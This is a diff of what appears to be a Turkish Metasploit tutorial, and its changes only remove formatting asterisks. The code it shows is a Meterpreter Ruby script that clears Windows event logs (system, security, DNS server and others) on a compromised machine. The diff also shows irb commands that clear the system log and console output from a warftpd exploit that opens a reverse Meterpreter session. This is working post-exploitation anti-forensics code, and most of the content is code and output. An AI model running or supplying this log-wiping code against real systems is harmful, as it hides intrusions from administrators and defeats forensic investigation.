@@ -32,17 +32,17 @@ def clrevtlgs**()**
     'dns server',
     'file replication service'
   **]**
-  print_status**(**"Clearing Event Logs, this will leave and event 517"**)**
+  print_status("Clearing Event Logs, this will leave and event 517")
   begin
     evtlogs.each **do** |evl|
-      print_status**(**"\tClearing the #{evl} Event Log"**)**
-      log **=** @client.sys.eventlog.open**(**evl**)**
+      print_status("\tClearing the #{evl} Event Log")
+      log **=** @client.sys.eventlog.open(evl)
       log.clear
-      file_local_write**(**@dest,"Cleared the #{evl} Event Log"**)**
+      file_local_write(@dest,"Cleared the #{evl} Event Log")
     end
-    print_status**(**"All Event Logs have been cleared"**)**
-  rescue ::Exception **=>** e
-    print_status**(**"Error clearing Event Log: #{e.class} #{e}"**)**
+    print_status("All Event Logs have been cleared")
+  rescue ::Exception => e
+    print_status("Error clearing Event Log: #{e.class} #{e}")
 
   end
 end
@@ -74,19 +74,19 @@ Biz sadece ‘system’ loglarını temizlemek istediğimizden yukarıdaki döng
 
 
 ```bash
-msf exploit**(**warftpd_165_user**)** > exploit
+msf exploit(warftpd_165_user) > exploit
 
 > Handler binding to LHOST 0.0.0.0
 > Started reverse handler
 > Connecting to FTP server 172.16.104.145:21...
 > Connected to target FTP server.
 > Trying target Windows 2000 SP0-SP4 English...
-> Transmitting intermediate stager **for **over-sized stage...**(**191 bytes**)**
-> Sending stage **(**2650 bytes**)**
+> Transmitting intermediate stager for **over-sized stage...(191 bytes)
+> Sending stage (2650 bytes)
 > Sleeping before handling stage...
-> Uploading DLL **(**75787 bytes**)**...
+> Uploading DLL (75787 bytes)...
 > Upload completed.
-> Meterpreter session 2 opened **(**172.16.104.130:4444 -> 172.16.104.145:1246**)**
+> Meterpreter session 2 opened (172.16.104.130:4444 -> 172.16.104.145:1246)
 ```
 
 
@@ -98,10 +98,10 @@ Ardından meterpreter shell içerisinden Ruby kodlayıcısını `irb` komutuyla 
 meterpreter > irb
 > Starting IRB shell
 > The 'client' variable holds the meterpreter client
-**>>** log **=** client.sys.eventlog.open**(**'system'**)**
-**=>** #>#:0xb6779424 @client=#>, #>, #
+**>>** log **=** client.sys.eventlog.open('system')
+=> #>#:0xb6779424 @client=#>, #>, #
 
-"windows/browser/facebook_extractiptc"**=>**#, "windows/antivirus/trendmicro_serverprotect_earthagent"=>#, "windows/browser/ie_iscomponentinstalled"=>#, "windows/exec/reverse_ord_tcp"=>#, "windows/http/apache_chunked"=>#, "windows/imap/novell_netmail_append"=>#
+"windows/browser/facebook_extractiptc"=>#, "windows/antivirus/trendmicro_serverprotect_earthagent"=>#, "windows/browser/ie_iscomponentinstalled"=>#, "windows/exec/reverse_ord_tcp"=>#, "windows/http/apache_chunked"=>#, "windows/imap/novell_netmail_append"=>#
 ```
 
 
@@ -111,7 +111,7 @@ meterpreter > irb
 
 ```bash
 **>>** log.clear
-**=>** #>#:0xb6779424 @client=#>,
+=> #>#:0xb6779424 @client=#>,
 
 /trendmicro_serverprotect_earthagent"=>#, "windows/browser/ie_iscomponentinstalled"=>#, "windows/exec/reverse_ord_tcp"=>#, "windows/http/apache_chunked"=>#, "windows/imap/novell_netmail_append"=>#
 ```
@@ -142,13 +142,13 @@ evtlogs **=** **[**
         'dns server',
         'file replication service'
         **]**
-print_line**(**"Clearing Event Logs, this will leave an event 517"**)**
+print_line("Clearing Event Logs, this will leave an event 517")
 evtlogs.each **do** |evl|
-        print_status**(**"Clearing the #{evl} Event Log"**)**
-        log **=** client.sys.eventlog.open**(**evl**)**
+        print_status("Clearing the #{evl} Event Log")
+        log **=** client.sys.eventlog.open(evl)
         log.clear
 end
-print_line**(**"All Clear! You are a Ninja!"**)**
+print_line("All Clear! You are a Ninja!")
 ```
 
 
@@ -157,19 +157,19 @@ Artık bu yeni oluşturduğunuz Script kodlarını yeni açtığınız Meterpret
 
 
 ```bash
-msf exploit**(**warftpd_165_user**)** > exploit
+msf exploit(warftpd_165_user) > exploit
 
 > Handler binding to LHOST 0.0.0.0
 > Started reverse handler
 > Connecting to FTP server 172.16.104.145:21...
 > Connected to target FTP server.
 > Trying target Windows 2000 SP0-SP4 English...
-> Transmitting intermediate stager **for **over-sized stage...**(**191 bytes**)**
-> Sending stage **(**2650 bytes**)**
+> Transmitting intermediate stager for **over-sized stage...(191 bytes)
+> Sending stage (2650 bytes)
 > Sleeping before handling stage...
-> Uploading DLL **(**75787 bytes**)**...
+> Uploading DLL (75787 bytes)...
 > Upload completed.
-> Meterpreter session 1 opened **(**172.16.104.130:4444 -> 172.16.104.145:1253**)**
+> Meterpreter session 1 opened (172.16.104.130:4444 -> 172.16.104.145:1253)
 
 meterpreter > run clearlogs
 Clearing Event Logs, this will leave an event 517
